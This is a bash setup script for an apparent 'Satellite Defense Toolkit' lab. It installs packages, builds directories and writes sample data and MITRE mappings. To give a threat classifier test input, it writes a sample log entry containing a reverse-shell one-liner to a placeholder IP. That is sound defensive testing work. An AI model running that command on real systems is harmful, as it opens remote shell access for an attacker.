#!/bin/bash

# Full Lab Setup Script for Satellite Defense Toolkit
# Prepares host for testing dashboard, OTA, firmware, AI, GNSS, etc.

set -euo pipefail

echo "[+] Updating system packages..."
sudo apt update && sudo apt install -y \
    git python3 python3-pip python3-venv \
    docker.io qemu-system-arm \
    rtl-sdr build-essential \
    iptables net-tools curl unzip

echo "[+] Creating virtual environment..."
python3 -m venv .venv
source .venv/bin/activate

echo "[+] Upgrading pip and installing Python libraries..."
pip install --upgrade pip
pip install \
    flask flask-socketio websocket-client websockets \
    transformers torch torchaudio openai \
    psutil rich pyyaml opencv-python Pillow numpy \
    vosk pyttsx3 stix2 taxii2-client yara-python

echo "[+] Creating directory structure..."
mkdir -p logs/dashboard
mkdir -p logs/ota_streams
mkdir -p results
mkdir -p sandbox
mkdir -p pcaps
mkdir -p observables
mkdir -p threat_feeds
mkdir -p webgui

echo "[+] Creating sample memory file..."
dd if=/dev/urandom of=/tmp/mem.bin bs=1M count=1

echo "[+] Creating simulated OTA binary stream..."
dd if=/dev/urandom of=logs/ota_streams/ota_stream.bin bs=4K count=10

echo "[+] Creating example log for threat classification..."
echo "Suspicious shell execution: bash -i >& /dev/tcp/1.2.3.4/443 0>&1" > logs/sample.log

echo "[+] Generating sample MITRE technique mapping..."
cat <<EOF > results/mitre_map.json
{
  "Execution": {
    "Command-Line Interface": "$(date -Iseconds)"
  },
  "Persistence": {
    "Startup Folder": "$(date -Iseconds)"
  }
}
EOF

echo "[+] Generating placeholder observed tactics..."
echo '["command-line interface", "startup folder"]' > observables/observed_tactics.json

echo "[✓] Lab setup complete. You may now launch modules or start the dashboard."
